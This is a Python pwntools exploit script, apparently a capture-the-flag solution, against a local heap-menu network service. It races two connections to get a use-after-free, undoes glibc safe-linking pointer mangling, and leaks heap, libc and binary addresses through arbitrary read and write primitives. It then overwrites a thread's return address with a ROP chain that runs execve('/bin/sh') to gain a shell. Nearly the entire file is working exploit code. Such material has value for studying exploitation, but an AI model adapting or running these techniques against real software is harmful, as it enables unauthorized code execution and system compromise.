#!/usr/bin/env python3
from pwn import *
import os
import time

# The distance from libc leak to the libc base
# p 0x7cfdf34170c0 -0x00007cfdf3200000 = 0x2170c0
libc_off = 0x2170c0

# For the first thread we have the offset fromlibc to the rsp
#  p 0x00007cfdf3200000-0x7cfdf31fe9e0 =  0x1620
stack_off = 0x1620

# The distance to ret address from RSP is
# p 0x71a3f128de98-0x71a3f128da50 = 0x448
ret_off = 0x448


# We need a leak of the binary base.
# We also need the address to be aligned to bypass the safe linking checks
# p 0x787ee97ffc80 - 0x787ee97fe9e0 = 0x12a0
# p/d $rsp - 0x787ee97ffc80 = -4768
base_leak_off = 0x12a0

# p 0x645e627505cd - 0x0000645e6274f000 = 0x15cd
base_off = 0x15cd

# The location of the libc leak is 0x1f0 before pos 
heap_off = 0x1f0

# The size of a chunk
off = 0x410

# setting the context
context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
port = 4444
binary = './challenge'
context.binary = binary

# Globals
index = 0

elf = ELF(binary)
libc = elf.libc

p = elf.process()

# b *challenge+141
if args.GDB:
    gdb.attach(p,aslr=False,gdbscript='''
    c
    ''')

def demangle(m,off):
    mid = m^((m>>12)+off)
    d = mid ^ (mid>>24)
    return d
def mangle(pos,ptr):
    m = (pos>>12) ^ ptr
    return m
# This is when we want to craft a poisoned mangled addres
def demangle_pos(pos,m):
    d = (pos>>12) ^ m
    return d

def forker(r1,r2,addr):
    # Prep
    global index
    r1.sendline(f'malloc {index} malloc {index+1} free {index+1}'.encode())

    # now we need to race...
    while True:
        if os.fork() == 0:
            # Inside the child
            r1.sendline(f'free {index}'.encode())
            os.kill(os.getpid(),9)
        # Inside the parrent
        r2.send((f'scanf {index} '.encode() + p64(addr) + b'\n')*2000)
        os.wait()

        time.sleep(0.1)
        r1.sendline(f'malloc {index} printf {index}'.encode())
        r1.recvuntil(b'Message: ')
        output = r1.recvline()[:-1]
        leak = u64(output.ljust(8,b'\x00'))
        if addr == leak:
            break


def arb_read(r1,r2,addr):
    global index
    forker(r1,r2,addr)
    r1.sendline(f'malloc {index+1}'.encode())
    r1.sendline(f'printf {index+1}'.encode())
    r1.recvuntil(b'Message: ')
    output = r1.recvline()[:-1]
    leak = u64(output.ljust(8,b'\x00'))
    r1.sendline(f'free {index}'.encode())

    r2.clean()
    r1.clean()

    # We should increment the index counter by 1
    index = index + 2
    return leak

def arb_write(r1,r2,addr,value):
    forker(r1,r2,addr)
    r1.sendline(f'malloc {index+1}'.encode())
    r1.sendline(f'scanf {index+1} '.encode() + value)
    # index = index + 2

def pthread_leak(r1,r2):
    # Prep
    print(r1.sendlineafter(b'Commands:', f'malloc {index} malloc {index+1} free {index+1} free {index}'.encode()).decode('latin-1'))

    # now we need to race...
    n = 1000
    p_id = os.fork()
    if p_id != 0:
        # Inside the child
        for _ in range(n):
            r1.sendline(f'malloc {index} free {index}'.encode())
        os.kill(p_id,9)
    else:
        # Inside the parrent
        for _ in range(n):
            r2.sendline(f'printf {index}'.encode())
        os.wait()

    output = r2.clean()
    print(set(output.splitlines()))
    leak = u64(next(a for a in output.split() if b'\x40' in a).ljust(8,b'\x00'))
    r1.clean()

    return leak 

# main
r1 = remote("localhost",port)
r2 = remote("localhost",port)

leak = pthread_leak(r1,r2)
log.success(f"We found the heap leak: {hex(leak)}")
dem_leak = demangle(leak,-1)
log.success(f"Demangled: {hex(dem_leak)}")
pos = dem_leak - off 
log.success(f"The positional address will be: {hex(pos)}")

# Now we need to leak the address to libc that is stored before pos
payload = mangle(pos=pos,ptr=(pos-heap_off))
log.success(f"The heap address that holds the libc address is: {hex(pos-heap_off)}")
log.success(f"The heap address mangled will be: {hex(payload)}")

leak = arb_read(r1,r2,payload)

log.success(f"The libc leak: {hex(leak)}")
libc.address = leak - libc_off
log.success(f"The libc base address will be: {hex(libc.address)}")


rsp = libc.address - stack_off
ret = rsp + ret_off
rbp = rsp + ret_off-8
b = rsp + base_leak_off
log.success(f"The rsp for this particular thread is: {hex(rsp)}")
log.success(f"The return address is: {hex(ret)}")
log.success(f"The rbp is: {hex(rbp)}")
log.success(f"The address of the base leak will be: {hex(b)}")
payload = mangle(pos=pos,ptr=b)
log.success(f"The mangled of the base leak address will be: {hex(payload)}")

leak = arb_read(r1,r2,payload)
log.success(f"The leak is: {hex(leak)}")
elf.address = leak - elf.sym['handle_connections']
log.success(f"The base of the binary is: {hex(elf.address)}")
log.success(f"The address of main is: {hex(elf.sym['main'])}")

# Time for ROP
rop = ROP([elf,libc], badchars=b'\x09\x0a\x0b\x0c\x0d\x0e\x20')
binsh = next(libc.search(b'/bin/sh\x00'))

rop.execve(binsh, 0, 0)

log.success(f"Lets write to RET our ROP chain")
addr = mangle(pos=pos,ptr=rbp-0x10)
padding = b'B'*0x18
payload = padding + rop.chain()
arb_write(r1,r2,addr,payload)
r1.sendline(f'quit'.encode())

p.interactive()
p.kill()
